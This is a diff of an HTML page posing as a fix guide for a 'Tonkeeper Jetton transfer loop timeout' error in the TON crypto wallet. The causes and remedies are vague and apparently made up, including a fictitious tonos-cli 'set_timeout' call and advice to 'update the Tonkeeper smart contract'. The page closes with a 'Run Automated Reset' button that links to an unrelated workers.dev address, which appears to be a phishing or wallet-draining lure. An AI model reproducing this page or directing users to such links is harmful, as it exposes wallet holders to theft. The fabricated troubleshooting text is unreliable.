@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,28 +41,33 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer Jettons, resulting in failed transactions and potential losses.</li>
+<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons within the TON ecosystem, resulting in failed transactions and potential loss of funds.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a misconfiguration in the Tonkeeper wallet settings or a temporary network congestion issue, causing the transfer loop to timeout.</li>
+<li>The error occurs due to a timeout in the Tonkeeper protocol, which is responsible for facilitating jetton transfers. This timeout can be caused by network congestion, high transaction volumes, or issues with the Tonkeeper smart contract.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Check the Tonkeeper wallet settings to ensure that the gas price and gas limit are set correctly:</li>
-<li>Verify the Ton blockchain network connection stability</li>
-<li>Check for any pending transactions that may be causing the timeout</li>
-<li>Adjust the transfer loop timeout settings using the following command:</li>
+<li>To resolve the issue, users can attempt the following manual overrides:</li>
+<li>Increase the transaction timeout threshold</li>
+<li>Implement a retry mechanism for failed transactions</li>
+<li>Update the Tonkeeper smart contract to optimize transaction processing</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>-s<span class="w"> </span>&lt;wallet_address&gt;<span class="w"> </span>--abi<span class="w"> </span>TonkeeperWallet.abi<span class="w"> </span>set_timeout<span class="w"> </span>&lt;new_timeout_value&gt;
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;retry_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for advanced debugging. </p>
+<p>Consider utilizing an external console to execute these commands for more efficient troubleshooting.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Tonos-cli installed and configured on the system</li>
-<li>Tonkeeper wallet and Jetton contract ABIs available</li>
-<li>Basic understanding of the TON blockchain and Tonkeeper wallet functionality</li>
+<li>Familiarity with the TON ecosystem and its protocols</li>
+<li>Access to the Tonkeeper smart contract code</li>
+<li>Understanding of JSON configuration files and transaction settings</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
